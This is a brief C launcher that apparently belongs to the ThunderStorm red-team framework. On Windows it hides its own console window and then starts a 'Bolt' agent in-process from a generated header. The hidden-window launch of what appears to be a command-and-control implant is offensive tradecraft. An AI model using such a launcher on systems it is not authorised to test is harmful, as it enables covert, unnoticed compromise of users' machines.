// Copyright (C) 2021 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//
// ThunderStorm Bolt Agent Binary Runner
//  Wraps the Go archive and will control a Bolt Agent
//
// Execute to directly launch a Bolt.
//  Runs in process.

// Windows Xp+
#define WINVER 0x0501
#define _WIN32_WINNT 0x0501
// Windows Vista+
// #define WINVER 0x0600
// #define _WIN32_WINNT 0x0600

#define NOCOMM
#define WIN32_LEAN_AND_MEAN

#include <windows.h>

// Bolt Include (Generated before compile)
#include "bolt.h"

int main(int argc, char *argv[]) {
    HANDLE c = GetConsoleWindow();
    if (c != NULL) {
        ShowWindow(c, SW_HIDE);
    }
    boltAgent(argc, 1);
    return 0;
}